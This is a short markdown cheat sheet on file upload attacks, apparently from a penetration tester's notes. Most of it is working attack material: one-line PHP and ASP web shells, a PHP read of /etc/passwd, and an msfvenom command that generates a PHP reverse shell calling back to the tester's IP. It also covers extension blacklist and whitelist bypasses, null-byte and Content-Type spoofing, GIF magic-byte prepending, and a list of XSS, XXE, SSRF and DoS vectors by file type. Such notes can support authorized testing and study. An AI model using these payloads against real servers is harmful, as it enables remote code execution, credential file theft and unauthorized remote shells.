#web #file-upload #webshell #bypass

# File Upload Attacks

Related: [file-inclusion](file-inclusion.md) · [command-injection](command-injection.md) · [shells-payloads](../Tools/shells-payloads.md)

## Web Shells
```php
<?php system($_REQUEST['cmd']); ?>
```
Basic PHP web shell.

```php
<?php echo file_get_contents('/etc/passwd'); ?>
```
Basic PHP file read.

```asp
<% eval request('cmd') %>
```
Basic ASP web shell.

```bash
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```
Generate a PHP reverse shell. See [shells-payloads](../Tools/shells-payloads.md).

## Blacklist Bypasses (extension)
```
shell.phtml
```
Uncommon but executable PHP extension (also `.php3`, `.php5`, `.phar`).

```
shell.pHp
```
Case manipulation.

## Whitelist Bypasses
```
shell.jpg.php
```
Double extension.

```
shell.php.jpg
```
Reverse double extension (needs misconfigured handler).

```
shell.php%00.jpg
```
Character injection before/after the extension (also `%20`, `%0a`, `%0d0a`, `/`, `.`).

## Content-Type / Magic Bytes
```
Content-Type: image/jpeg
```
Change the declared Content-Type to a permitted type.

```
GIF8
```
Prepend valid magic bytes so a content sniffer treats the file as an image. See [file-inclusion](file-inclusion.md).

## Limited-Upload Attack Matrix
```
XSS -> HTML, JS, SVG, GIF
XXE/SSRF -> XML, SVG, PDF, PPT, DOC
DoS -> ZIP, JPG, PNG
```
What to try when only certain file types are allowed. See [xss](xss.md) · [server-side-attacks](server-side-attacks.md).
